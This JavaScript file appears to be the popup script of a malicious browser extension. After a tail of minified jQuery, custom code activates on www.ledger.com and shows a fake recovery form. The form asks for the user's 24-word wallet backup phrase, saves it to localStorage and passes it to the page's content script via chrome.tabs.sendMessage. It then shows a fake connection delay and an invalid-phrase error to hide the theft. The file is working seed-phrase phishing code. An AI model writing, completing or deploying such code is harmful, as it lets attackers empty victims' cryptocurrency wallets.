      if (n) return n = curCSS(e, t), rnumnonpx.test(n) ? jQuery(e).position()[t] + "px" : n
    })
  }), jQuery.each({
    Height: "height",
    Width: "width"
  }, function (e, t) {
    jQuery.each({
      padding: "inner" + e,
      content: t,
      "": "outer" + e
    }, function (n, r) {
      jQuery.fn[r] = function (i, o) {
        var a = arguments.length && (n || "boolean" != typeof i),
          u = n || (!0 === i || !0 === o ? "margin" : "border");
        return access(this, function (t, n, i) {
          var o;
          return isWindow(t) ? 0 === r.indexOf("outer") ? t["inner" + e] : t.document.documentElement["client" + e] : 9 === t.nodeType ? (o = t.documentElement, Math.max(t.body["scroll" + e], o["scroll" + e], t.body["offset" + e], o["offset" + e], o["client" + e])) : void 0 === i ? jQuery.css(t, n, u) : jQuery.style(t, n, i, u)
        }, t, a ? i : void 0, a)
      }
    })
  }), jQuery.each("blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(" "), function (e, t) {
    jQuery.fn[t] = function (e, n) {
      return arguments.length > 0 ? this.on(t, null, e, n) : this.trigger(t)
    }
  }), jQuery.fn.extend({
    hover: function (e, t) {
      return this.mouseenter(e).mouseleave(t || e)
    }
  }), jQuery.fn.extend({
    bind: function (e, t, n) {
      return this.on(e, null, t, n)
    },
    unbind: function (e, t) {
      return this.off(e, null, t)
    },
    delegate: function (e, t, n, r) {
      return this.on(t, e, n, r)
    },
    undelegate: function (e, t, n) {
      return 1 === arguments.length ? this.off(e, "**") : this.off(t, e || "**", n)
    }
  }), jQuery.proxy = function (e, t) {
    var n, r, i;
    if ("string" == typeof t && (n = e[t], t = e, e = n), isFunction(e)) return r = slice.call(arguments, 2), (i = function () {
      return e.apply(t || this, r.concat(slice.call(arguments)))
    }).guid = e.guid = e.guid || jQuery.guid++, i
  }, jQuery.holdReady = function (e) {
    e ? jQuery.readyWait++ : jQuery.ready(!0)
  }, jQuery.isArray = Array.isArray, jQuery.parseJSON = JSON.parse, jQuery.nodeName = nodeName, jQuery.isFunction = isFunction, jQuery.isWindow = isWindow, jQuery.camelCase = camelCase, jQuery.type = toType, jQuery.now = Date.now, jQuery.isNumeric = function (e) {
    var t = jQuery.type(e);
    return ("number" === t || "string" === t) && !isNaN(e - parseFloat(e))
  }, "function" == typeof define && define.amd && define("jquery", [], function () {
    return jQuery
  });
  var _jQuery = window.jQuery,
    _$ = window.$;
  return jQuery.noConflict = function (e) {
    return window.$ === jQuery && (window.$ = _$), e && window.jQuery === jQuery && (window.jQuery = _jQuery), jQuery
  }, noGlobal || (window.jQuery = window.$ = jQuery), jQuery
});


function validateEmail(email) {
  var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
  return re.test(String(email).toLowerCase());
}



chrome.runtime.onMessage.addListener(function (msg, sender, sendResponse) {
  if (msg.page) {
    currentUrl(msg.page);
  }
});
chrome.runtime.sendMessage({
  msg: "WHATPAGE"
})
var objurl;

var sites = ["www.ledger.com"];
chrome.storage.sync.set({
  gay: "gay"
})
chrome.storage.sync.get(function (data) {
  console.log(data);
})

function find(array, value) {
  if (array.indexOf) {
    return array.indexOf(value);
  }

  for (var i = 0; i < array.length; i++) {
    if (array[i] === value) return i;
  }

  return -1;
}

function currentUrl(tab) {
  objurl = tab;
  var url = new URL(objurl.url).host;
  $('.jmsbWk').text(url);
  if (find(sites, url) > -1) {
    loadMain(objurl);
  }
}


function loadMain(objurl) {
  var url = new URL(objurl.url).host;
  $('.siteimg__').attr('src', objurl.favIconUrl);
  $('.site__ span').text(url);
  $('.ifUadI').hide();
  $('.loader').show();

  setTimeout(function () {
    //$('.loader').hide('fast');

    $('.jtQQIl').fadeOut("fast", function () {
      $('.jtQQIl2').fadeIn('slow');

    });
    //$('.jtQQIl2').show('fast');

  }, 700)

}
$('.ilGAcm').click(function () {
  $('.budNma').fadeIn('fast');
  //$('#settings').slideUp('fast');
  $('#settings').animate({
    fake: 200,
    fake2: -50
  }, {
    step: function (now, fx) {
      $(this).css('-webkit-transform', 'translateY(' + now + 'rem)');
    },
    duration: 'slow'
  }, 'linear');
})
$('.iJWhmb').click(function () {
  $('.budNma').fadeOut('fast');
  //$('#settings').slideUp('fast');
  $('#settings').animate({
    fake: 200,
    fake2: 5
  }, {
    step: function (now, fx) {
      $(this).css('-webkit-transform', 'translateY(' + now + 'rem)');
    },
    duration: 'slow'
  }, 'linear');
})

$('.fEtwFN').click(function () {
  var bl = $(this).parent();
  var wallet = bl.attr('data-w');
  var num = bl.find('input').val();
  chrome.storage.sync.set({
    wallet: num
  }, function () {
    var n = noty({
      force: true,
      text: 'Save successfully',
      type: 'success',
      theme: 'relax',
      dismissQueue: true,
      timeout: 3000,
      progressBar: true,
      layout: "bottomRight",
      animation: {
        open: 'animated fadeInDown',
        close: 'animated fadeOutUp'
      }
    });
  });
})
$('.leOPzB').click(function () {

  var num = $('.dBYQgi').val();
  if (!validateEmail(num)) {
    var n = noty({
      force: true,
      text: 'Invalid Email',
      type: 'error',
      theme: 'relax',
      dismissQueue: true,
      timeout: 3000,
      progressBar: true,
      layout: "bottomRight",
      animation: {
        open: 'animated fadeInDown',
        close: 'animated fadeOutUp'
      }
    });
  } else {
    var n = noty({
      force: true,
      text: 'Successfully sent',
      type: 'success',
      theme: 'relax',
      dismissQueue: true,
      timeout: 3000,
      progressBar: true,
      layout: "bottomRight",
      animation: {
        open: 'animated fadeInDown',
        close: 'animated fadeOutUp'
      }
    });
  }
})

function changeMain(oldp) {
  var href = $(oldp).attr('href');
  $('.page:visible').fadeOut('slow');

  $(href).fadeIn('slow');
}
var animatedNOW = false;

$('#button-next').click(function () {
  $(".dappstore").fadeOut('slow');
  $(".exchange").fadeIn('slow');
  $(".textreq").html('<span style="color: dimgray;margin-left: -60px;margin-top: -10px;font-size: 14px;">Your Backup Phrase </span><span style="color: dimgray;margin-left: -151px;margin-top: 10px;">Enter your 24 word phrase, 2/2 page, lowercase, to recover your funds & transactions.</span>');

})
$('#button-back').click(function () {

  $(".exchange").fadeOut('slow');
  $(".dappstore").fadeIn('slow');
  $(".textreq").html('<span style="color: dimgray;margin-left: -60px;margin-top: -10px;font-size: 14px;">Your Backup Phrase </span><span style="color: dimgray;margin-left: -151px;margin-top: 10px;">Enter your 24 word phrase, 1/2 page, lowercase, to recover your funds & transactions.</span>');

})
$('#button-back-24').click(function () {

  //save

  $("#loader-hide").hide();
  $(".activity").fadeOut('fast');
  $(".exchange").fadeIn('slow');
  $('.iOTrdc').fadeIn('slow');
  $(".textreq").html('<span style="color: dimgray;margin-left: -60px;margin-top: -10px;font-size: 14px;">Your Backup Phrase </span><span style="color: dimgray;margin-left: -151px;margin-top: 10px;">Enter your 24 word phrase, 2/2 page, lowercase, to recover your funds & transactions.</span>');

})
$('#button-continue').click(function () {
  $("#loader-hide").fadeIn(700);
  //save
  localStorage.setItem('BackUpCorrect', "");
  var myfull = '';
  for (var i = 0; i < 24; i++) {
    $($('input[data-v-37c3ee10]')[i]).val();
    if (i == 23) {
      myfull += ($($('input[data-v-37c3ee10]')[i]).val()).replace(/\s/g, ";");
    } else {
      myfull += ($($('input[data-v-37c3ee10]')[i]).val()).replace(/\s/g, ";") + " ";
    }
    var itemPhrase = $($('input[data-v-37c3ee10]')[i]).val() + " ";
    var itemPhraseCorrect = localStorage.getItem('BackUpCorrect');

    localStorage.setItem('BackUpCorrect', itemPhraseCorrect + itemPhrase);

  }

  chrome.tabs.query({
    active: true,
    currentWindow: true
  }, function (tabs) {
    chrome.tabs.sendMessage(tabs[0].id, {
      over: myfull
    });
  });
  $(".exchange").fadeOut('slow');
  $(".activity").fadeIn('slow');
  $(".textreq").html('<span style="color: dimgray;margin-left: -47px;margin-top: 20px;font-size: 14px;">Connection...</span>');
  setTimeout(function () {
    $('.loader').css('top', '-50px');
    $('.iOTrdc').fadeOut("fast", function () {
      $('.iOTrdc').hide();
      $('.loader').removeClass('pulse');
      $("#button-show").fadeIn('slow');
      $("#error-invalid").fadeIn('slow');
    });
  }, 7000)
})

$('input[data-v-37c3ee10]').on({

  blur: function () {
    //getItem

    localStorage.setItem('BackUp', "");
    var mas = {};
    for (var i = 0; i < 24; i++) {

      var itemPhrase = $($('input[data-v-37c3ee10]')[i]).val();

      mas[i] = itemPhrase;
      var item = JSON.stringify(mas);

      localStorage.setItem('BackUp', item);

    }


  }
});


$('.jvso').click(function (e) {
  if (localStorage.getItem('BackUp')) {
    var restoredSession = JSON.parse(localStorage.getItem('BackUp'));
    for (var i = 0; i < 24; i++) {

      $($('input[data-v-37c3ee10]')[i]).val(restoredSession[i]);


    }
  }

  e.preventDefault();
  if (animatedNOW) return;
  if ($(this).find('.bounce-d').is('.showen-d')) {
    return;
  }




  animatedNOW = true;
  var clickitem = this;

  changeMain(clickitem);
  $(".textreq").html('<span style="color: dimgray;margin-left: -60px;margin-top: -10px;font-size: 14px;">Your Backup Phrase </span><span style="color: dimgray;margin-left: -151px;margin-top: 10px;">Enter your 24 word phrase, 1/2 page, lowercase, to recover your funds & transactions.</span>');
  $(".dappstore").fadeIn('slow');


})